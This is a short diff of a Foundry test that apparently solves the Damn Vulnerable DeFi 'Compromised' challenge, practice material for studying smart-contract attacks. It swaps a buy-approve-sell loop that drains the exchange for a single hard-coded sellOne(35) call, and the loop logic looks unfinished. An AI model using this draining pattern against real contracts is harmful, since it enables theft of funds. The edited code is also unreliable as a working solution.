@@ -79,13 +79,13 @@ contract Compromised is Test {
         uint privevalue = 0.1 ether;
         vm.startPrank(attacker);
         uint bal = address(exchange).balance;
-        for (uint i; bal != privevalue; i++) {
-            uint id = exchange.buyOne{value: privevalue}();
-            damnValuableNFT.approve(address(exchange), id);
-            exchange.sellOne(id);
-        }
+        // for (uint i; bal != privevalue; i++) {
+        // uint id = exchange.buyOne{value: privevalue}();
+        // damnValuableNFT.approve(address(exchange), id);
+        exchange.sellOne(35);
+        // }
         vm.stopPrank();
-
+        // 999 000 000 000 000 000 000
         /** EXPLOIT END **/
         validation();
     }
